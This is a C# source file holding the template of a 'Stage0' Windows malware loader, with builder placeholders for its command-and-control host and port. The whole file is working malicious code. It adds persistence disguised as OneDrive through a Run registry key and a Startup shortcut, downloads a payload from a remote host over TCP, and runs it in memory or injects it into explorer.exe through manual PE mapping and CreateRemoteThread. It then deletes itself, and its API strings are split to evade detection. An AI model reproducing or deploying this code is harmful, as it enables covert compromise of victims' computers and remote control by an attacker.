// Dosya: Build/Stage0Template.cs
namespace App.Service
{
    public static class Stage0Template
    {
        public const string Source = @"using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

static class Stage0
{
    const int PORT = %%PORT%%;
    const int MODE = %%MEMORYMODE%%;
    const bool SELF_DELETE = %%SELFDELETE%%;
    const bool BIND = %%EXPLORERBIND%%;

    static readonly string HOST = %%HOST%%;
    static readonly string MUTEX = %%MUTEX%%;
    static readonly string FULLPATH = %%STAGE0FULL%%;

    static Mutex MX;

    static string D(string b)
    {
        try { return Encoding.UTF8.GetString(Convert.FromBase64String(b)); } catch { return b; }
    }

    static string Q(string s) { return (char)34 + (s ?? """") + (char)34; }

    [STAThread]
    static void Main()
    {
        bool fresh;
        try { MX = new Mutex(true, MUTEX + ""_s0"", out fresh); }
        catch { fresh = true; }
        if (!fresh) return;

        if (BIND) Bind();

        while (true)
        {
            try
            {
                byte[] bin = Request();
                if (bin != null && bin.Length > 0)
                {
                    bool ok = MODE == 0 ? LoadInMemory(bin) : InjectIntoExplorer(bin);
                    if (ok)
                    {
                        if (SELF_DELETE) SelfDelete();
                        if (MODE == 0) Thread.Sleep(Timeout.Infinite);
                        return;
                    }
                }
            }
            catch { }
            Thread.Sleep(60000);
        }
    }

    static void Bind()
    {
        try
        {
            string exe = SelfPath();
            if (string.IsNullOrEmpty(exe)) return;

            string run = ""Soft"" + ""ware\\Micro"" + ""soft\\Win"" + ""dows\\Current"" + ""Version\\Run"";
            using (var k = Registry.CurrentUser.CreateSubKey(run))
                if (k != null) k.SetValue(""One"" + ""Drive"", Q(exe), RegistryValueKind.String);

            try
            {
                string lnk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ""One"" + ""Drive.lnk"");
                if (!File.Exists(lnk))
                {
                    Type t = Type.GetTypeFromProgID(""WScript."" + ""Shell"");
                    dynamic sh = Activator.CreateInstance(t);
                    dynamic s = sh.CreateShortcut(lnk);
                    s.TargetPath = exe;
                    s.WorkingDirectory = Path.GetDirectoryName(exe);
                    s.WindowStyle = 7;
                    s.Save();
                }
            }
            catch { }
        }
        catch { }
    }

    static string SelfPath()
    {
        try
        {
            string l = Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(l)) return l;
        }
        catch { }
        try { return Process.GetCurrentProcess().MainModule.FileName; } catch { return FULLPATH; }
    }

    static bool LoadInMemory(byte[] bin)
    {
        try
        {
            Assembly asm = Assembly.Load(bin);
            Type t = asm.GetType(""App.Service.Program"");
            if (t == null) return false;

            MethodInfo m = t.GetMethod(""Boot"", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            if (m == null) m = t.GetMethod(""Main"", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            if (m == null) return false;

            var th = new Thread(() => { try { m.Invoke(null, new object[] { new string[] { ""--m"", ""--dll"" } }); } catch { } });
            th.IsBackground = true;
            th.SetApartmentState(ApartmentState.STA);
            th.Start();
            Thread.Sleep(400);
            return true;
        }
        catch { return false; }
    }

    [DllImport(""ker"" + ""nel"" + ""32.dll"", CharSet = CharSet.Ansi)] static extern IntPtr LoadLibraryA(string p);
    [DllImport(""ker"" + ""nel"" + ""32.dll"", CharSet = CharSet.Ansi)] static extern IntPtr GetProcAddress(IntPtr h, string p);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate IntPtr OpenProcessFn(uint a, bool i, int pid);
    [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate IntPtr VirtualAllocExFn(IntPtr h, IntPtr addr, UIntPtr size, uint type, uint prot);
    [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate bool WriteProcessMemoryFn(IntPtr h, IntPtr addr, byte[] buf, UIntPtr size, out UIntPtr written);
    [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate IntPtr CreateRemoteThreadFn(IntPtr h, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
    [UnmanagedFunctionPointer(CallingConvention.Winapi)] delegate bool CloseHandleFn(IntPtr h);

    static T Fn<T>(string dll, string name) where T : class
    {
        try
        {
            IntPtr h = LoadLibraryA(dll);
            if (h == IntPtr.Zero) return null;
            IntPtr p = GetProcAddress(h, name);
            if (p == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer(p, typeof(T)) as T;
        }
        catch { return null; }
    }

    static bool InjectIntoExplorer(byte[] pe)
    {
        IntPtr hp = IntPtr.Zero, addr = IntPtr.Zero, th = IntPtr.Zero;
        string k32 = ""ker"" + ""nel"" + ""32.dll"";
        try
        {
            if (pe.Length < 0x200) return false;
            int peOff = BitConverter.ToInt32(pe, 0x3C);
            if (peOff <= 0 || peOff + 0x120 >= pe.Length) return false;

            ushort magic = BitConverter.ToUInt16(pe, peOff + 0x18);
            bool x64 = magic == 0x20B;
            if (!x64 && Environment.Is64BitOperatingSystem) return false;

            int entryRva   = BitConverter.ToInt32(pe, peOff + 0x18 + 0x10);
            long imageBase = x64 ? BitConverter.ToInt64(pe, peOff + 0x18 + 0x18) : BitConverter.ToInt32(pe, peOff + 0x18 + 0x1C);
            int sizeImage  = BitConverter.ToInt32(pe, peOff + 0x18 + 0x38);
            int sizeHead   = BitConverter.ToInt32(pe, peOff + 0x18 + 0x3C);
            int secCount   = BitConverter.ToUInt16(pe, peOff + 0x06);
            int optSize    = BitConverter.ToUInt16(pe, peOff + 0x14);
            int dirBase    = peOff + 0x18 + (x64 ? 0x70 : 0x60);
            int relocRva   = dirBase + 0x28 < pe.Length ? BitConverter.ToInt32(pe, dirBase + 0x28) : 0;
            int relocSize  = dirBase + 0x2C < pe.Length ? BitConverter.ToInt32(pe, dirBase + 0x2C) : 0;
            int secOff     = peOff + 0x18 + optSize;

            if (sizeImage <= 0 || secCount <= 0 || secCount > 96) return false;

            var fOpen   = Fn<OpenProcessFn>(k32, ""Open"" + ""Process"");
            var fAlloc  = Fn<VirtualAllocExFn>(k32, ""Virt"" + ""ual"" + ""Alloc"" + ""Ex"");
            var fWrite  = Fn<WriteProcessMemoryFn>(k32, ""Write"" + ""Process"" + ""Memory"");
            var fThread = Fn<CreateRemoteThreadFn>(k32, ""Create"" + ""Remote"" + ""Thread"");
            var fClose  = Fn<CloseHandleFn>(k32, ""Close"" + ""Handle"");
            if (fOpen == null || fAlloc == null || fWrite == null || fThread == null) return false;

            Process target = null;
            foreach (var p in Process.GetProcessesByName(""explo"" + ""rer"")) { target = p; break; }
            if (target == null) return false;

            hp = fOpen(0x1F0FFF, false, target.Id);
            if (hp == IntPtr.Zero) return false;

            addr = fAlloc(hp, (IntPtr)imageBase, (UIntPtr)sizeImage, 0x3000, 0x04);
            if (addr == IntPtr.Zero) addr = fAlloc(hp, IntPtr.Zero, (UIntPtr)sizeImage, 0x3000, 0x04);
            if (addr == IntPtr.Zero) return false;

            byte[] head = new byte[sizeHead];
            Buffer.BlockCopy(pe, 0, head, 0, Math.Min(sizeHead, pe.Length));
            if (!Write(hp, fWrite, addr, head, 0)) return false;

            for (int i = 0; i < secCount; i++)
            {
                int o = secOff + i * 40;
                if (o + 40 > pe.Length) break;
                int vsize  = BitConverter.ToInt32(pe, o + 8);
                int rva    = BitConverter.ToInt32(pe, o + 12);
                int rsize  = BitConverter.ToInt32(pe, o + 16);
                int rptr   = BitConverter.ToInt32(pe, o + 20);
                if (vsize <= 0 || rptr <= 0 || rsize <= 0) continue;
                if (rptr + rsize > pe.Length) rsize = pe.Length - rptr;
                if (rsize <= 0) continue;
                byte[] sec = new byte[rsize];
                Buffer.BlockCopy(pe, rptr, sec, 0, rsize);
                if (!Write(hp, fWrite, addr, sec, rva)) return false;
            }

            long delta = addr.ToInt64() - imageBase;
            if (delta != 0 && relocSize > 0 && relocRva > 0) Relocate(pe, hp, fWrite, addr, delta, relocRva, relocSize);

            th = fThread(hp, IntPtr.Zero, 0, new IntPtr(addr.ToInt64() + entryRva), IntPtr.Zero, 0, IntPtr.Zero);
            if (th == IntPtr.Zero) return false;

            Thread.Sleep(700);
            return true;
        }
        catch { return false; }
        finally
        {
            try { if (th != IntPtr.Zero) Fn<CloseHandleFn>(k32, ""Close"" + ""Handle"")(th); } catch { }
            try { if (hp != IntPtr.Zero) Fn<CloseHandleFn>(k32, ""Close"" + ""Handle"")(hp); } catch { }
        }
    }

    static bool Write(IntPtr hp, WriteProcessMemoryFn f, IntPtr baseAddr, byte[] data, int rva)
    {
        UIntPtr w;
        return f(hp, new IntPtr(baseAddr.ToInt64() + rva), data, (UIntPtr)data.Length, out w);
    }

    static void Relocate(byte[] pe, IntPtr hp, WriteProcessMemoryFn f, IntPtr baseAddr, long delta, int relocRva, int relocSize)
    {
        try
        {
            int end = relocRva + relocSize;
            int i = relocRva;
            while (i + 8 <= end && i + 8 <= pe.Length)
            {
                int page = BitConverter.ToInt32(pe, i);
                int block = BitConverter.ToInt32(pe, i + 4);
                if (block < 8) break;
                int n = (block - 8) / 2;
                for (int j = 0; j < n; j++)
                {
                    int e = i + 8 + j * 2;
                    if (e + 2 > pe.Length) break;
                    ushort v = BitConverter.ToUInt16(pe, e);
                    int type = v >> 12;
                    int off = v & 0x0FFF;
                    if (type != 3 && type != 10) continue;

                    long at = baseAddr.ToInt64() + page + off;
                    UIntPtr w;
                    if (type == 3)
                    {
                        byte[] buf = new byte[4];
                        if (!f(hp, new IntPtr(at), buf, (UIntPtr)4, out w)) continue;
                        long cur = BitConverter.ToInt32(buf, 0) + delta;
                        f(hp, new IntPtr(at), BitConverter.GetBytes((int)cur), (UIntPtr)4, out w);
                    }
                    else
                    {
                        byte[] buf = new byte[8];
                        if (!f(hp, new IntPtr(at), buf, (UIntPtr)8, out w)) continue;
                        long cur = BitConverter.ToInt64(buf, 0) + delta;
                        f(hp, new IntPtr(at), BitConverter.GetBytes(cur), (UIntPtr)8, out w);
                    }
                }
                i += block;
            }
        }
        catch { }
    }

    static byte[] Request()
    {
        try
        {
            using (var c = new TcpClient())
            {
                c.Connect(HOST, PORT);
                c.ReceiveTimeout = 15000;
                c.SendTimeout = 15000;
                var ns = c.GetStream();

                byte[] req = Encoding.UTF8.GetBytes(""MEM|REQ"");
                ns.Write(req, 0, req.Length);
                ns.Flush();

                byte[] h = new byte[4];
                if (!Full(ns, h)) return null;
                int len = BitConverter.ToInt32(h, 0);
                if (len <= 0 || len > 96 * 1024 * 1024) return null;

                byte[] body = new byte[len];
                if (!Full(ns, body)) return null;

                string r = Encoding.UTF8.GetString(body);
                if (r.StartsWith(""MEM|BIN|"")) return Convert.FromBase64String(r.Substring(8));
                return null;
            }
        }
        catch { return null; }
    }

    static bool Full(Stream s, byte[] b)
    {
        int r = 0;
        while (r < b.Length)
        {
            int x = s.Read(b, r, b.Length - r);
            if (x <= 0) return false;
            r += x;
        }
        return true;
    }

    static void SelfDelete()
    {
        try
        {
            string self = SelfPath();
            if (string.IsNullOrEmpty(self)) return;

            string bat = Path.Combine(Path.GetTempPath(), ""s"" + Guid.NewGuid().ToString(""N"").Substring(0, 8) + "".bat"");
            File.WriteAllText(bat,
                ""@echo off\r\n"" +
                ""timeout /t 3 /nobreak > nul\r\n"" +
                ""del "" + Q(self) + ""\r\n"" +
                ""del "" + Q(bat) + ""\r\n"");

            Process.Start(new ProcessStartInfo(""cm"" + ""d.exe"", ""/c "" + Q(bat))
            { WindowStyle = ProcessWindowStyle.Hidden, UseShellExecute = true });
        }
        catch { }
    }
}
";
    }
}